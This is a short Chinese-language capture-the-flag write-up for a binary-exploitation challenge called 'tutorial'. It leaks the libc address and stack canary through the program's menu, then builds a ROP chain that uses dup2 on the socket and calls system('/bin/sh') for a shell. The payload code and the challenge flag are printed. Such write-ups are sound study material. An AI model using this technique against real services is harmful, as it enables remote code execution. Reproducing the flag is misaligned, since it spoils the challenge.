# tutorial

由於自己對於網路程式設計還沒有概念，而且執行檔在 local 跑不起來，不能用 gdb 觀察，所以看得蠻吃力的。後來感謝 bruce 學長的提點，才順利解出來XD

## 解題流程

程式一開始會建立 socket 連線，然後執行 `fork` 後進入 `menu(int socket)` 選單。

* 選項 1 會輸出 `puts()` 的 address 扣掉 1280 的值，可以從這邊推出 libc address。
* 選項 2 會接收長達 460 bytes 的輸入，並從輸入 buffer 開始輸出 324bytes。透過 IDA 得知該 buffer 的起點位在  `rbp-320` ，所以這裡可以 leak 出位於 `rbp-8` 的 canary。

```C
write(socket_num, "Time to test your exploit...\n", 0x1DuLL);
write(socket_num, ">", 1uLL);
read(socket_num, &s, 460uLL);
write(socket_num, &s, 324uLL);
```

* 選項 3 離開程式。

----------

有了 libc address 和 canary 後就可以開始蓋 ROP chain 了。原本想直接蓋 `system` 開 shell，不知道為什麼失敗了，問了才知道由於前面的 `fork`，這邊直接叫 `system` 的話 file descriptor 會接不起來。所以我們要先用 `dup2()` 把 fd 設好才行。
由於前面呼叫 `read`  時已經把 rdi 設成我們要的值了，所以用 `dup2` 之前只要再把 rsi 設好即可。

```python
chain = 'A'*312 + p64(canary) + 'B'*8 +
	  p64(pop_rsi_r15_ret) + p64(0x0) + p64(0xdeadbeef) + p64(dup2) +
	  p64(pop_rsi_r15_ret) + p64(0x1) + p64(0xdeadbeef) + p64(dup2) +
	  p64(pop_rdi_ret) + p64(binsh) + p64(system)
```

把一開始 `accept` 的回傳值送給 `stdin` 和 `stdout` 之後 call `system` 就可以拿到 shell 了。

```
FLAG{3ASY_R0P_R0P_P0P_P0P_YUM_YUM_CHUM_CHUM}
```
